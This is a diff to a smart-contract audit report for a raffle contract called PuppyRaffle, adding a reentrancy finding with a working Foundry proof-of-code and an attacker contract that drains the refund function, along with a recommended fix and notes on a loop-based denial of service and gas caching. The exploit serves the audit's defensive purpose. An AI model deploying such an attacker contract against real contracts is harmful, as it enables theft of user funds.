@@ -1,3 +1,126 @@
+### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance.
+
+**Description:** The `PuppyRaffle::refund` function does not follow CEI (Check, Effects, Interactions) and as a result, enables participants to drain contract balance.
+
+In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.
+
+<details>
+
+```javascript
+   function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
+@>      payable(msg.sender).sendValue(entranceFee);
+@>      players[playerIndex] = address(0);
+        emit RaffleRefunded(playerAddress);
+    }
+```
+
+</details>
+
+A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle till the contract balance is drained.
+
+**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.
+
+**Proof of Concept:**
+
+1. User enters the raffle.
+2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
+3. Attacker enters the raffle.
+4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.
+
+**Proof of Code**
+Place the following into `PuppyRaffleTest.t.sol`
+
+<details>
+<summary>Code</summary>
+
+```javascript
+ function test_reentrancyRefund() public {
+        address[] memory players = new address[](4);
+        players[0] = playerOne;
+        players[1] = playerTwo;
+        players[2] = playerThree;
+        players[3] = playerFour;
+        puppyRaffle.enterRaffle{value: entranceFee * 4}(players);
+
+        ReetrancyAttacker attackerContract = new ReetrancyAttacker(puppyRaffle);
+        address attackUser = makeAddr("attackUser");
+        vm.deal(attackUser, 1 ether);
+
+        uint256 startingAttackContractBalance = address(attackerContract).balance;
+        uint256 startingContractBalance = address(puppyRaffle).balance;
+
+        // attack
+        vm.prank(attackUser);
+        attackerContract.attack{value: entranceFee}();
+
+        console.log("starting attacker contract balance: ", startingAttackContractBalance);
+        console.log("starting contrackt balance:", startingContractBalance);
+
+        console.log("ending attacker contract balance", address(attackerContract).balance);
+        console.log("ending contract balance", address(puppyRaffle).balance);
+    }
+```
+
+And this contract as well:
+
+```javascript
+contract ReetrancyAttacker {
+    PuppyRaffle puppyRaffle;
+    uint256 entranceFee;
+    uint256 attackerIndex;
+
+    constructor(PuppyRaffle _puppyRaffle) {
+        puppyRaffle = _puppyRaffle;
+        entranceFee = puppyRaffle.entranceFee();
+    }
+
+    function attack() external payable {
+        address[] memory players = new address[](1);
+        players[0] = address(this);
+        puppyRaffle.enterRaffle{value: entranceFee}(players);
+        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
+        puppyRaffle.refund(attackerIndex);
+    }
+
+    function _stealMoney() internal {
+        if (address(puppyRaffle).balance >= entranceFee) {
+            puppyRaffle.refund(attackerIndex);
+        }
+    }
+
+    fallback() external payable {
+        _stealMoney();
+    }
+
+    receive() external payable {
+        _stealMoney();
+    }
+```
+
+</details>
+
+**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle:refund` function update the `players` array before making the external call. Additionally, we should move the event emission up as well.
+
+```diff
+    function refund(uint256 playerIndex) public {
+        address playerAddress = players[playerIndex];
+        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
+        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+
++       players[playerIndex] = address(0);
++       emit RaffleRefunded(playerAddress);
+
+        payable(msg.sender).sendValue(entranceFee);
+
+-       players[playerIndex] = address(0);
+-       emit RaffleRefunded(playerAddress);
+    }
+```
+
 ### [M-#] Looping through players array to check to duplicates in `PuppyRaffel::enterRaffel` is a potential denial of service (DoS) attack, incrementing gas costs for future entrants.
 
 **Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle stats will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make.
@@ -25,6 +148,7 @@ This is more than 3x more expensive for the second 100 players.
 
 <details>
 <summary>PoC</summary>
+
 Place the following test into `PuppyRaffleTest.t.sol`.
 
 ```javascript
@@ -81,6 +205,8 @@ Instances:
 - `PuppyRaffle::rareImageUri` should be `constant`
 
 ### [G-2] Storage variable in a loop should be cached
+
+Everytime you call `players.lenght` you read from storage, as opposed to memory whice is more gas afficient.
 
 ```diff
 +    uint256 playerLength = players.lenght;
